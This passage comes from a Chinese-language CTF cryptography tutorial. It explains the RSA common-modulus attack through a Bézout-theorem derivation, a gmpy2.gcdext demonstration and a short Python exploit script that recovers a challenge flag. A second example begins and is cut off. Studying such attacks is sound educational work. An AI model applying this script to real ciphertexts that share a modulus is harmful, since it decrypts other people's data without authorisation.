class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mord">2</span></span></span><span style="top:-0.009999999999999953em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>接下来根据已知和定理推导这个攻击过程：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>因为存在</mtext><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以由裴蜀定理得存在</mtext><mi>s</mi><mo separator="true">,</mo><mi>t</mi><mo>∈</mo><mi>Z</mi><mtext>有</mtext><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi><mo>+</mo><msub><mi>e</mi><mn>2</mn></msub><mi>t</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>所以</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><mo>=</mo><mo stretchy="false">(</mo><msup><mi>m</mi><msub><mi>e</mi><mn>1</mn></msub></msup><msup><mo stretchy="false">)</mo><mi>s</mi></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi></mrow></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup><mo>=</mo><mo stretchy="false">(</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><msup><mo stretchy="false">)</mo><mi>t</mi></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>2</mn></msub><mi>t</mi></mrow></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>所以</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi></mrow></msup><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>2</mn></msub><mi>t</mi></mrow></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>可以得到</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi><mo>+</mo><msub><mi>e</mi><mn>2</mn></msub><mi>t</mi></mrow></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>最后得到</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup><mo>=</mo><mi>m</mi><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}因为存在(e_1,e_2)=1\\所以由裴蜀定理得存在s,t∈Z有e_1s+e_2t=1\\所以\\c_1^{s}=(m^{e_1})^{s}~~mod~(n)=m^{e_1s}~~mod~(n)\\c_2^{t}=(m^{e_2})^{t}~~mod~(n)=m^{e_2t}~~mod~(n)\\所以\\c_1^{s}c_2^{t} = m^{e_1s}m^{e_2t}~~mod(n)\\可以得到\\c_1^{s}c_2^{t} = m^{e_1s+e_2t}~~mod(n)\\最后得到\\c_1^{s}c_2^{t} = m~~mod(n)\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.2em;vertical-align:-6.35em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.849999999999999em;"><span style="top:-9.009999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span><span style="top:-7.809999999999999em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">裴</span><span class="mord cjk_fallback">蜀</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord cjk_fallback">有</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span><span style="top:-6.6099999999999985em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span></span></span><span style="top:-5.409999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-4.209999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-3.0099999999999976em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span></span></span><span style="top:-1.8099999999999976em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-0.6099999999999983em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span><span style="top:0.590000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:1.7900000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span><span style="top:2.9899999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">m</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p></details><ul><li>现在就将问题转换为求<code>s</code>、<code>t</code>，这里我们可以使用拓展欧几里得算法进行计算。在Python中的<code>gmpy2</code>库有一个函数<code>gcdext(a1,a2)</code>这个函数可以用来计算<code>s</code>、<code>t</code>，接下来就介绍这个函数的使用<ul><li>这个函数传入的是两个参数：<code>e1</code>、<code>e2</code></li><li>这个函数内部实现的就是拓展欧几里得算法，这个算法的具体过程不多介绍</li><li>这个函数返回值有三个：<code>第一个返回值</code>返回的是<code>gcd(e1,e2)</code>的值，<code>第二个返回值</code>返回的是<code>s</code>，<code>第三个返回值</code>返回的是<code>t</code></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e1 = <span class="number">43019</span></span><br><span class="line">e2 = <span class="number">54011</span></span><br><span class="line">gmpy2.gcdext(e1,e2)</span><br><span class="line">mpz(<span class="number">1</span>), mpz(<span class="number">23050</span>), mpz(-<span class="number">18359</span>)</span><br></pre></td></tr></table></figure><ul><li>现在直接给出例题的exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e1 = <span class="number">35603</span></span><br><span class="line">e2 = <span class="number">53849</span></span><br><span class="line">n = <span class="number">65844835114811311147300780798656143825222359960203887804404336766671754915238143105361685751338600606205234241717554977556014391502151140599030174376626752597123335946780943028787393505875282845874194789937021373169837205020116739523929406808658690735666690634468817779530981170477446002242151051007841320499</span></span><br><span class="line">c1 = <span class="number">3652946455096596922421828601712210382877573893656617028922252423601007198550547136141125408399184017530737069617361752419721283095525888153494847215557513043342658287550672860273427773994030007220020707376113461073627581510167395737557600247794396378096347654764650186631167120330986770904279007941507562441</span></span><br><span class="line">c2 = <span class="number">16647423266182678960959947505427682046836995492595463854876112200789807987236540245845356081678424736418596164492737256401436506552449871347507391421521217966841767869954716106409257585276208800895615701515817235738827206889142921421410764420295206520038281264810899421047195121134469562492729516621808418924</span></span><br><span class="line">_, s1, s2 = gmpy2.gcdext(e1,e2)</span><br><span class="line">m = (<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># flag&#123;12025e72-7f21-4cf1-b779-7d343e6c28e8&#125;</span></span><br></pre></td></tr></table></figure><h3 id="共模攻击2"><a class="markdownIt-Anchor" href="#共模攻击2"></a> 共模攻击2</h3><ul><li>现在来介绍一下当<code>gcd(e1,e2)≠1</code>的情况，这种情况仍然要先使用<code>gmpy2.gcdext(e1,e2)</code>，推导过程如<strong>共模攻击1</strong>。</li><li>接下来给出一个例题：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span 